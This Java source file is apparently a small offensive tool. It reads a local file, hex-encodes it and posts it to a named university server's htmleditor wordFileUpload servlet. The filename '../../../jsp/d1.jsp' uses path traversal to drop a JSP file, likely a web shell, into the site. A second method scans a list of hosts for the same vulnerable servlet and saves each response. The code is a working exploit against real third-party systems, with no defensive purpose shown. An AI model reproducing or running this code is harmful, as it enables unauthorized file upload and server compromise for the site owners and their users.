package qgb.project.ccsu;

import java.io.InputStream;

import qgb.*;

import qgb.net.HttpRequest;
import qgb.project.JDBC_Test;


public class WriteJsp {
	
	public static void main(String[] args) {
		String sthex=U.readSt("c.txt");
		U.print(sthex);
		U.print(sthex.length());//3109*4
		U.print(U.readBytes("c.txt").length);
		sthex=F.toHexString(U.readBytes("c.txt"));
		for (int i = 0; i < 1; i++) {
			U.print("Hex:"+sthex.length());
			
			HttpRequest.post("http://sxx.ccsu.cn/servlet/com.cicro.cws.htmleditor.wordFileUpload", "filename=../../../jsp/d1.jsp&filepath=/&file="
							+sthex);
			try {
				Thread.sleep(999);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		//
		//GetTomcatVersion();
	}

	private static void GetTomcatVersion() {
		String stin= U.readSt("sld.txt"),sta="";
		InputStream is;
		//U.print(stin);
		String[] yst=stin.split("\n");
		int in=0;
		for (int i = 0; i < yst.length; i++) {
			yst[i]=yst[i].substring(0,yst[i].length()-1);
			sta="http://"+yst[i]+"/servlet/com.cicro.cws.htmleditor.wordFileUpload";
			try {
				is= HttpRequest.get(sta);
				U.write("/v/"+yst[i]+".html", is);
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			//U.print(sta);
		}
		//U.print(yst);
	}
	
}
